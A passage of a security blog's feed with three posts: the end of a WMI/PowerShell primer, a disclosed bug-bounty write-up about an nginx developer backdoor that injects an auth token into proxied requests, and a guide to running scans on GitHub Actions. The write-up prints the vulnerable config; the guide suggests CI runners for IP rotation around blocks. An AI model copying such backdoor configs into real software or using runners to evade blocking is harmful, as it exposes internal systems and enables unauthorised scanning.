<p><strong>TIP</strong>: The names of the commands are pretty self-explanatory (and we&rsquo;ll dig into more later as well). At any point in time, you can use Powershell&rsquo;s standard syntax: <code>help &lt;command&gt;</code> to get more info on what the specific command does. e.g. you might want to try <code>help Invoke-WmiMethod</code> to view what the command does &ndash; very similar to Linux manpages.</p></blockquote>
<p>From Powershell v3 onwards, MS introduced CIM cmdlets which make use of WS-MAN and CIM standards to manage objects. Having access to CIM cmdlets has advantages in 2 contexts:</p>
<ul>
<li>In machines where WMI/DCOM itself is blocked from running (maybe due to a host-based firewall rule?) but WinRM/WS-MAN (Windows Remote Management) is enabled, we can still use CIM to do exactly what we can do with WMI.</li>
<li>CIM itself is an industry-standard and is implemented cross-platform, which means it can be used to work with non-Windows boxes as well.</li>
</ul>
<blockquote>
<p>Phew! That&rsquo;s a mouthful of words. Let&rsquo;s understand what the new terms here mean:</p>
<p><strong>DCOM</strong>: An alias for Distributed Component Object Model, DCOM is a proprietary Microsoft protocol for communication between software components on networked computers. WMI uses Distributed COM (DCOM) to connect to a remote machine. However, DCOM isn&rsquo;t that firewall-friendly.</p>
<p><strong>WS-MAN</strong>: WS-MAN or WS-Management is a DMTF standard that provides a common way for systems to access management information across the IT infrastructure. WS-MAN on the other hand uses HTTP, so is definitely firewall-friendly.</p></blockquote>
<p>We&rsquo;ll redo what we did above, but after changing the Powershell version back to default (in my case I&rsquo;ve Powershell v5):</p>

    <img src="cimcmds.png"  alt="CIM"  class="center"  />


<p>Repeating what we said above, CIM cmdlets can do <em>everything</em> that WMI cmdlets can. If we want to map the functionalities between both WMI cmdlets and CIM cmdlets, here&rsquo;s a tabular representation of the functionality comparison between both types:</p>
<table>
  <thead>
      <tr>
          <th>Use \ Types</th>
          <th>WMI Cmdlets</th>
          <th>CIM Cmdlets</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Get information about classes</td>
          <td><code>Get-WmiObject</code></td>
          <td><code>Get-CimInstance</code></td>
      </tr>
      <tr>
          <td>Invoking a method</td>
          <td><code>Invoke-WmiMethod</code></td>
          <td><code>Invoke-CimMethod</code></td>
      </tr>
      <tr>
          <td>Subscribing to an event</td>
          <td><code>Register-WmiEvent</code></td>
          <td><code>Register-CimIndicationEvent</code></td>
      </tr>
      <tr>
          <td>Creating/updating instances of a class</td>
          <td><code>Set-WmiInstance</code></td>
          <td><code>Set-CimInstance</code></td>
      </tr>
      <tr>
          <td>Deleting instances of a class</td>
          <td><code>Remove-WmiObject</code></td>
          <td><code>Remove-CimInstance</code></td>
      </tr>
  </tbody>
</table>
<h3 id="running-wmi-queries-with-powershell">Running WMI queries with Powershell</h3>
<p>Now that we know about the different cmdlets available for us to use, we can try running the sample WQL query above. We already know that <code>Get-WmiObject</code> can be used to get info about classes. So let&rsquo;s run the cmdlet with the <code>-Query</code> parameter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Query <span style="color:#e6db74">&#39;select * from win32_bios&#39;</span>
</span></span></code></pre></div>
    <img src="wql.png"  alt="WQL"  class="center"  />


<h2 id="conclusion">Conclusion</h2>
<p>This blog post was meant for giving an overview of what we&rsquo;ll be dealing with in the next parts of the series. There are a lot of technical buzzwords here but understanding them is necessary. I hope you enjoyed reading through so far, and I&rsquo;m looking forward to our journey together into exploring WMI.</p>
<p>Adios amigo!</p>
]]></content>
        </item>
        
        <item>
            <title>Pwning a Backend with a Backdoor</title>
            <link>https://0xinfection.xyz/posts/pwning-a-backend-with-a-backdoor/</link>
            <pubDate>Mon, 31 May 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/pwning-a-backend-with-a-backdoor/</guid>
            <description>&lt;p&gt;Development is a important task. But mindful secure development is much more important. In this quick blog post, I detail an unusual way in which I was able to escalate access to several production instances behind a properly secured network.&lt;/p&gt;
&lt;h2 id=&#34;how-it-started&#34;&gt;How it started.&lt;/h2&gt;
&lt;p&gt;It all started with me casually checking some traffic data for a tool I authored on GitHub. GitHub allows you to view a few stats for the past 14 days, viz. visitors, clones, etc on a repository.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Development is a important task. But mindful secure development is much more important. In this quick blog post, I detail an unusual way in which I was able to escalate access to several production instances behind a properly secured network.</p>
<h2 id="how-it-started">How it started.</h2>
<p>It all started with me casually checking some traffic data for a tool I authored on GitHub. GitHub allows you to view a few stats for the past 14 days, viz. visitors, clones, etc on a repository.</p>
<p>A particularly interesting referring site URL caught my attention:</p>

    <img src="domains.png"  alt="Domains"  class="center"  />


<p>How do you resist yourself from a temptation like this? Anyways, I took the bait and started digging.</p>
<p>The first thing that I always do in these situations is to verify whether or not my target site has a security contact. This is very important to avoid stepping into legal trouble. Luckily, this one had an independent VDP running, so I decided to proceed forward.</p>
<p>An obvious question that arises here is how did this particular URL land on the stats page? Its obvious that someone clicked a link to this repository from some &ldquo;dashboard&rdquo;. To my understanding, GitHub accumulates these traffic stats from the <code>Referer</code> header sent from the browser, which contains the URL of the previous web-page from where the request originated. So its fairly safe to assume that they have some sort of &ldquo;dashboards&rdquo; which contain links to be clicked.</p>
<h2 id="mapping-the-target">Mapping the target.</h2>
<p>I spent the next half an hour trying to map the target. A quick nmap fast scan on the IP at which it was pointing to yielded two open ports, both running HTTP — <code>3000</code>, <code>8008</code>. My immediate presumption was Grafana — since <code>3000</code> is usually the default port for Grafana instances. However, it turned out that it was not quite the case. Visiting <code>http://redacted.com:3000</code> in the browser landed me nowhere, the browser simply showed a &ldquo;Too Many Redirects&rdquo; error. I figured that it was probably a production instance so it was secured properly behind ACLs.</p>
<p>I decided to quickly spin up <a href="https://github.com/ffuf/ffuf">ffuf</a> and do some basic content enumeration for port <code>8008</code> (<a href="https://github.com/duyet/bruteforce-database">bruteforce-database</a> is one of my favorites when it comes to content discovery on production servers). Few minutes later, here’s what I saw looking at the terminal:</p>

    <img src="ffuf.png"  alt="ffuf"  class="center"  />


<p>Interesting right, lets visit the path in our browser? I was surprised when I got redirected couple of times and I landed on this page on an entirely different subdomain at <a href="https://monitoring.redacted.com/dashboards">https://monitoring.redacted.com/dashboards</a>.</p>

    <img src="grafana.png"  alt="grafana"  class="center"  />


<p>Fiddling around a bit, but carefully, I figured that I was logged in with admin privileges. I could delete dashboards, create/delete new playlists and snapshots, and of course view sensitive monitoring data of several production servers. Adding to this, the dashboard also revealed an associated proxied Prometheus REST API that was totally unauthenticated. I wasn’t familiar with PromQL before, so after <a href="https://promlabs.com/promql-cheat-sheet/">reading about it</a>, I figured that I could extract much more sensitive data via the API:</p>

    <img src="prometheus.png"  alt="prometheus"  class="center"  />


<p>It was at this moment I stopped testing and decided to report my findings to the security contact email.</p>
<h2 id="but-wait-what-happened-there">But wait, what happened there?</h2>
<p>Web-apps often fascinate me when it comes to the weird intricacies I encounter. This one was no exception and really caught my attention. I decided to dig deeper into what could&rsquo;ve triggered this behavior. Long story short, I concluded that the <code>/cont_useradmin/</code> path somehow acted like a proxy which gave me authenticated access to their internal VPN, which is why I was able to directly access the Grafana monitoring dashboards with admin privileges. <strong>Authenticated</strong> — because few additional headers somehow got added with the default set of headers in the request:</p>

    <img src="burp.png"  alt="burp"  class="center"  />


<p>However, this wasn’t clearly satisfying my curiosity so I courteously asked the security contact to let me know what exactly caused this behavior. Within a few days, I received a response back that they’ve patched the issue and passed me a developer contact from whom I can get my questions answered. Exchanging a few words with him, I could finally get the whole picture of what was going on.</p>
<p>It turned out that it was indeed an intentionally introduced <em>developer backdoor</em> that I accessed. The actual cause of this was the misconfigured nginx server on port <code>8008</code> that allowed the developer (implying anyone) to directly access the production environment for debugging purposes. He was open enough to admit that he directly implemented the config file from an answer on an online forum without actually understanding the security context of the scenario.</p>
<p>The <code>nginx.conf</code> file of the HTTP server looked like this:</p>
<pre tabindex="0"><code class="language-conf" data-lang="conf">user              www-data;
worker_processes  1;
error_log         /var/log/nginx/error.log;
pid               /var/run/nginx.pid;

events {
  worker_connections  1024;
}

...snip...

http {
  include            /etc/nginx/mime.types;
  access_log         /var/log/nginx/access.log;
  sendfile           on;
  keepalive_timeout  65;
  tcp_nodelay        on;

  server {
    listen      *:8008;
    access_log  /var/log/nginx/access.8008.log;
    location    /cont_useradmin/ {
      rewrite           /cont_useradmin(.*) $1 break;
      proxy_pass        http://172.20.0.1:60000;
      proxy_redirect    off;
      proxy_set_header  Host             $host;
      proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;
      proxy_set_header  X-Ingress-Token  e44c571c-e313-4720-80ed-ee13ed4eebe4
        }
    }
}

...snip...
</code></pre><p>Already noticed what wrong? Let me break it down anyways. The configuration forwards any request to the <code>/cont_useradmin/</code> endpoint on port <code>8008</code>, to the internal IP <code>172.20.0.1:60000</code> with the <code>X-Ingress-Token</code> authentication header. The port <code>60000</code> was hosting an internal router daemon that mapped all their internal production endpoints. The router wasn&rsquo;t publicly accessible and accepted connections from specific whitelisted IPs with proper authentication, i.e. the <code>X-Ingress-Token</code> header, which the developer had intentionally embedded into the nginx config.</p>

    <img src="attack-surface.png"  alt="attack-surface"  class="center"  />


<p>Now that the router saw I was authenticated and was trying to access the <code>dashboard-prod</code> subdomain it redirected me to the Grafana instance as per its mapping configuration. Moreover all requests via the router were whitelisted explicitly, implying that I was essentially acting as an administrator.</p>
<p>The developer explained that it was a self-hosted Jira board from which the link to my GitHub repository originated. The router by default maps all outbound HTTP traffic from their internal HTTP endpoints via the <code>dashboard-prod</code> subdomain which I saw in my stats page on GitHub.</p>
<h2 id="takeaways">Takeaways</h2>
<h3 id="for-developers">For Developers</h3>
<p>Development is indeed a tough task, but securing things is far more important. Even though the developers took considerable measures to secure their production environment by putting it behind a VPN, I was still able to access their internal network via a simple misconfiguration. Developer backdoors are cool and allows quick access, but it might be fatal if anyone else discovers it — due to the elevated level of privileges they usually have.</p>
<p>It is also a good practice to implement access control in several places. In this case, every service that the router mapped — should’ve had additional authentication which essentially prevents lateral movement. I could have probed the router with queries to find more sensitive services thereafter and hence could’ve compromised their internal network. Imagine how such a simple mistake could lead to such devastating results.</p>
<p>Here’s a fun quote from <a href="https://twitter.com/s0md3v">Somdev</a> who reviewed this article (thanks to him!):</p>
<blockquote>
<p>Back-ends with back-doors are just front-doors.</p></blockquote>
<h3 id="for-security-folks">For Security Folks</h3>
<p>Never settle for less. Always look out for weird behavior in web-apps and try messing around with it. You might find things where you’re least expecting it.</p>
<p>That’s it! With good food for thought, I hereby conclude. Until next time. Cheers! 🥂</p>
]]></content>
        </item>
        
        <item>
            <title>Utilizing CI/CDs to the Fullest for Fun and Profit</title>
            <link>https://0xinfection.xyz/posts/utilizing-ci/cds-to-the-fullest-for-fun-and-profit/</link>
            <pubDate>Sun, 24 Jan 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/utilizing-ci/cds-to-the-fullest-for-fun-and-profit/</guid>
            <description>&lt;p&gt;Hey folks,&lt;/p&gt;
&lt;p&gt;We all have heard of CI/CDs right? I was exploring GitHub Actions and what I found was the fact that it was an extremely underrated resource which is not quite widely used for general purposes by people. In this blog post, I aim to detail how people can really benefit from CI/CDs with GitHub Actions in focus, and how one can fully exploit the resource to get the most out of it. This post is more inclined at security people, but literally anyone could use this guide to escalate up their productivity, plus a bonus at the end. 😉&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Hey folks,</p>
<p>We all have heard of CI/CDs right? I was exploring GitHub Actions and what I found was the fact that it was an extremely underrated resource which is not quite widely used for general purposes by people. In this blog post, I aim to detail how people can really benefit from CI/CDs with GitHub Actions in focus, and how one can fully exploit the resource to get the most out of it. This post is more inclined at security people, but literally anyone could use this guide to escalate up their productivity, plus a bonus at the end. 😉</p>
<h2 id="wait-what-is-cicd">Wait, what is CI/CD?</h2>
<p>Lets refer to what Wikipedia has to say:</p>
<blockquote>
<p>In software engineering, CI/CD generally refers to the combined practices of continuous integration and either continuous delivery or continuous deployment. CI/CD bridges the gaps between development and operation activities and teams by enforcing automation in building, testing and deployment of applications.</p></blockquote>
<p>So basically it is a setup utilized by developers to automate building &amp; deployment of their apps. You noticed the catch here? “Automation”. Well that’s what we’re absolutely interested in.</p>
<p>GitHub Actions was made available for public use back in November, 2019 and indeed offers a great toolset which can drastically improve one’s work potency. At the time of writing this blog, GitHub offers free 2000 minutes per month, (which is more than 1 hour daily!) for free users.</p>
<p>If you cannot afford a private server/VPS to run your scripts on, GitHub Actions got you covered. Additionally, if you’re into bug bounties, you must already know that the competition out there is huge and one should actually try to automate things as much as possible. Lets see what all of this is about, shall we?</p>
<h3 id="understanding-the-requirementsusage">Understanding the Requirements/Usage</h3>
<p>If you have ever used any cloud platform, you will certainly know how easily you can spin up instances for a task and then shut the machine down as soon as the task is over. Well, on a fairly abstracted level, this is almost the same. Simply put, every time you “run a build”, you get a fresh new machine which allows you to setup a couple of dependencies and then you can run your scripts up there howsoever you like. There are already well-known techniques that leverage monitoring setups, certificate transparency monitoring for getting new subdomains, e.g. sublert, cert-spotter, etc. CI/CD platforms prove to be an extremely feasible resource in such cases.</p>
<p>Exploring things on a much broader level, it is quite evident that you get several advantages in using such kind of setups. Apart from the hardware (although virtualized) and network bandwidth, one just cannot rule out the fact that you get a fresh new setup spun up in a matter of seconds. Having a new setup also includes installing dependencies afresh and often has perks over a cluttered up home setup where multiple versions of a same dependency might mess up with the runtime results.</p>
<p>CI/CDs also prove to be a useful resource when you have a heavy I/O or time-consuming task at hand which can take hours to complete. Do you have to run a full nmap port scan on a couple of targets or probably a an entire CIDR? Do you need to extract &amp; parse a huge dataset and run a few scripts on it? Well, integrated tools make lives much easier in these cases.</p>
<h2 id="getting-started">Getting Started</h2>
<p>So how do we achieve this? Lets dive in rightaway.</p>
<blockquote>
<p><strong>NOTE</strong>: This assumes that you have a basic understanding of how Git and GitHub works, if not, I’d highly recommend getting a good grip on both the topics.</p></blockquote>
<h3 id="understanding-the-syntax">Understanding the Syntax</h3>
<p>All that GitHub Actions requires, is a YAML file containing the configuration on how you’d like to setup the workflow. There are a lot of things to cover when it comes to a custom CI/CD automation setup and docs explain it very well, however, I&rsquo;ll try breaking down things to make this as simple as possible. Stay with me.</p>
<p>An exemplary simple workflow in a Python environment configuration looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">name</span>: <span style="color:#ae81ff">My Custom Automation Setup</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">on</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Triggers the workflow when you push a commit to master branch</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">push</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">branches</span>: [ <span style="color:#ae81ff">master ]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Allows you to run this workflow manually from the Actions tab</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">workflow_dispatch</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">jobs</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">runs-on</span>: <span style="color:#ae81ff">ubuntu-latest </span> <span style="color:#75715e"># The type of os that the job will run on</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">steps</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/checkout@v2</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Setup python</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/setup-python@v2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">python-version</span>: <span style="color:#ae81ff">3.8</span>  <span style="color:#75715e"># Specifies your python version</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Sets up the dependencies using pip, either manually or using a requirements.txt file</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Install all dependencies</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python -m pip install --upgrade pip
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python -m pip install requests selenium ...
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python -m pip install -r requirements.txt</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Run the your script/set of scripts</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Run the scripts here</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python script1.py
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python script2.py
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python script3.py
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ...</span>
</span></span></code></pre></div><p>Lets quickly break the major components down into simple steps:</p>
<ul>
<li>The <code>on</code> directive (line 3) specifies when the build should initiate, in our case we have designated to run this workflow in both situations, when a commit is pushed to the master branch of the repository, as well as manually trigger it whenever required — the <em>workflow_dispatch</em> switch.</li>
<li>The <code>runs-on</code> (line 12) directive specifies on what platform should the code run on, in our case we have chosen the latest Ubuntu as our distro.</li>
<li>The next 2 chunk of steps (line 15–26) is actually setting up the environment, which in our case is setting up Python and then installing the dependencies. If you’re using Python, it is highly recommended that you should use a <code>requirements.txt</code> file to manage your dependencies, which would otherwise result in discrepancies.</li>
<li>The last couple of lines (line 30–33) runs your actual code and produces the desired output.</li>
</ul>
<p>Two points of interest to note here:</p>
<ul>
<li>the <code>run</code> directive, if specified anywhere, will execute a set of commands to run on the system. This is equivalent to directly typing commands on your terminal.</li>
<li>the <code>name</code> key is simply used as an identifier for a block of commands serving a particular purpose, makes things look neat when the workflow is actually running.</li>
</ul>
<p>The aforementioned setup suits best in situations when you intend to run a single/set of scripts at your will. A worth noting point is that, there is no restriction on the number of workflows nor in the number of repositories you create, i.e. you can create multiple workflows for a single script as well as one workflow per script. Its entirely upto you how you orchestrate your setup to best suit your needs. The only restriction here is the time for which you can execute the workflows.</p>
<p>Now that we know how to create a simple workflow, lets take a look at enriching our setup by adding more capabilities. The first item on the list is to add a way where we can run the script on a regular basis. How? The answer lies in GitHub Actions’ cron feature which lets you to setup cronjobs. As shown below, simply add a schedule directive with the cron key to the on section.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">on</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">push</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">branches</span>: [ <span style="color:#ae81ff">master ]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">schedule</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Runs the script daily at 00:00 UTC</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">cron</span>: <span style="color:#e6db74">&#39;0 0 * * *&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">workflow_dispatch</span>:
</span></span></code></pre></div><p>So far what we did was to setting a cronjob that runs daily at 00:00 UTC. The cron syntax is a bit tricky and if you do not understand it, you can use <a href="http://crontab.guru">crontab.guru</a> to setup a cronjob according to a time which you find feasible. That’s it, your scripts are all set to run daily when you’re deep asleep and the next day, your automation setup will present you with a new set of possible assets/vulnerabilities to poke at!</p>
<p>Another important aspect of creating an automation setup is logging the results to an output file. Any output your scripts generate will be lost as soon the workflow completes. This situation can be tackled in a variety of ways (e.g. pinging the output to a slack channel), but personally my favourite is to just simply commit all the output files back to the repository after the workflow has completed. To do so, we can simply append the following at the end of the script (make sure to maintain even indentation).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Commit and push</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">stefanzweifel/git-auto-commit-action@v4.2.0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">commit_message</span>: <span style="color:#ae81ff">Your commit message</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">commit_user_name</span>: <span style="color:#e6db74">&#39;My Automation&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">commit_user_email</span>: <span style="color:#e6db74">&#39;literally-anything-here@github.com&#39;</span>
</span></span></code></pre></div><p>The final resultant workflow YAML file should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">name</span>: <span style="color:#ae81ff">My Custom Automation</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">on</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Runs daily at 00:00 UTC</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">schedule</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">cron</span>: <span style="color:#e6db74">&#39;0 0 * * *&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">workflow_dispatch</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">jobs</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">runs-on</span>: <span style="color:#ae81ff">ubuntu-latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">steps</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/checkout@v2</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Setup python</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/setup-python@v2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">python-version</span>: <span style="color:#ae81ff">3.8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name </span>: <span style="color:#ae81ff">Install dependencies</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python -m pip install --upgrade pip
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          python -m pip install bs4 html2markdown selenium requests</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># results.json will be committed back on GitHub</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Run the scraper</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: <span style="color:#ae81ff">python mainscript.py -o results.json</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Commit and push</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">stefanzweifel/git-auto-commit-action@v4.2.0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">commit_message</span>: <span style="color:#ae81ff">Regenerate GitBook (${{ github.sha }})</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">commit_user_name</span>: <span style="color:#e6db74">&#39;Automation Runner&#39;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">commit_user_email</span>: <span style="color:#e6db74">&#39;github-actions.automation@github.com&#39;</span>
</span></span></code></pre></div><h3 id="creating-the-setup">Creating the Setup</h3>
<p>So far, we know how to write a config file for a GitHub Actions setup, lets put it into action:</p>
<ol>
<li>A good point to start would be to create a private repository on GitHub and upload your scripts up there.</li>
<li>Once it is done, you can create a <code>.github/</code> folder under the root directory of your repo, and then create a folder named workflows/ and put the main.yml file in. Or, you can switch to the Actions tab and start writing your own config file (GitHub helps you by auto-completing suggestions, which I think is great).</li>
<li>As soon as you commit the file, a &ldquo;build&rdquo; should automatically trigger running your script(s) for the first time.</li>
</ol>
<p>That’s it, you’re all set.</p>
<h2 id="why-should-i-use-it">Why should I use it?</h2>
<p>Its an obvious thing that “Why should I use it?” question appears? Usually there are 2 aspects of the issue, the first is the network bandwidth, and secondly the hardware (RAM &amp; CPU) available. Well, lets look at some benchmarks, shall we?</p>

    <img src="network.png"  alt="Network"  class="center"  />


<p>To answer the first part of the question, you get over 1.5 Gigabit/s network bandwidth, which I think is far greater than an average home network. So if your scripts consume significant bandwidth, e.g. make a lot of HTTP queries, they’ll likely run way faster than if you run them on your own home network. The image below answers the second part of the question:</p>

    <img src="cpu.png"  alt="CPU"  class="center"  />


<p>You get a 2-core CPU each clocked at 2.30GHz which is quite fair in my opinion. A very astonishing thing I observed was that it offers almost ~50MB cache memory which is way more than any normal PC/laptop.</p>

    <img src="memory.png"  alt="Memory"  class="center"  />


<p>As for RAM, you have a total of 10GB at your disposal (4GB swap and 6GB available), which I personally think is great and should be sufficient for all kinds of scripts you’re planning to run on it.</p>
<h2 id="few-example-usecases">Few Example Usecases</h2>
<p>Well, so far we have seen the whats’ and hows’. Lets take a look at some whens’:</p>
<ul>
<li>Full <strong>port scans</strong> usually take a lot of time and bandwidth. Additionally the time exponentially increases if you need to spoof the source packet address.</li>
<li><strong>Downloading and parsing large datasets</strong> to extract information for research purposes.</li>
<li><strong>IP exclusivity</strong>: In pentesting, you might come across cases where a security solution rate-limits/blocks your IP address from sending packets to their system. I have personally observed CI/CDs spinning up runners on a different IP than that of its previous execution, so that’s where this might come handy!</li>
<li><strong>Continuous monitoring</strong> setups like subdomain discovery throught CT monitoring, or setups checking for changes in page content.</li>
<li>and so on&hellip;</li>
</ul>
<h2 id="automation-might-be-an-alias-of-laziness">Automation might be an alias of laziness</h2>
<p>After seeing the innumerable benefits of using Actions, I tried using it for my daily tasks. But I’m too lazy to write config files for every task and then go ahead and upload it to GitHub. 🥱</p>
<p>Therefore, I decided to go ahead and write <a href="https://github.com/0xInfection/Bludger">Bludger</a>, an automation framework around GitHub Actions, because <em>why not</em>? It has a powerful templating engine coupled with automatic repository creation/deletion/cloning and a lot of other features which allows you to make use of the CI on a daily basis with minimal effort. 😉</p>
<p>Lets take look at a simple use-case where we run <a href="https://github.com/robertdavidgraham/masscan">masscan</a> on <code>1.1.1.1/28</code>:</p>
<ol>
<li>First step would of course be to install the tool. Simply follow the <a href="https://github.com/0xInfection/Bludger/wiki/Setup">setup instructions</a> of the tool and try getting a basic understanding of the <a href="https://github.com/0xInfection/Bludger/wiki/Usage">command line arguments</a> it supports. Once you’ve setup your access token lets step ahead.</li>
<li>Now, lets directly execute the one-in-all command:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./bludger.py -n massrun -T basic-shell --clone <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-C <span style="color:#e6db74">&#39;sudo apt install masscan &amp;&amp; sudo masscan --rate 1000 1.1.1.1/28 -p 1-1024 -oJ 1.1.1.1.json&#39;</span>
</span></span></code></pre></div><p>So what happened in the above command?</p>
<ul>
<li><code>-n massrun</code>: Created a new repository massrun.</li>
<li><code>-T basic-shell</code>: Makes use of the template <a href="https://github.com/0xInfection/Bludger/blob/master/templates/basic-shell.yml">basic-shell.yml</a> under <code>templates/</code> folder.</li>
<li><code>-C &lt;command&gt;</code>: Takes in the command you want to run for that template. In our case, we first installed masscan, then ran the tool to scan the first 1024 ports for all hosts in <code>1.1.1.1/28</code> at rate of 1000 packets/s.</li>
<li><code>--clone</code>: Finally, clone the repository under the <code>custom/</code> folder so that you can see the results altogether (since we used the <code>-oJ</code> switch to output the scan results as JSON).</li>
</ul>
<p>Wait, its that simple? Yes! For more info, you can refer to the <a href="https://github.com/0xInfection/Bludger/wiki">wiki</a> of the repository.</p>
<h2 id="concluding-thoughts">Concluding thoughts</h2>
<p>Thinking about it, GitHub Actions is a powerful toolset that can indeed be used to level up your productivity as well as ease your daily life by letting the CI do the heavy job for you. However, it is also important that you make use of the resource keeping in mind <a href="https://docs.github.com/en/github/site-policy/github-additional-product-terms">GitHub’s Terms</a>. With this good food for thought, I hereby conclude this article.</p>
<p>Hope you learnt a new thing today, and of course, start using the tool on a daily basis to game up your productivity!</p>
]]></content>
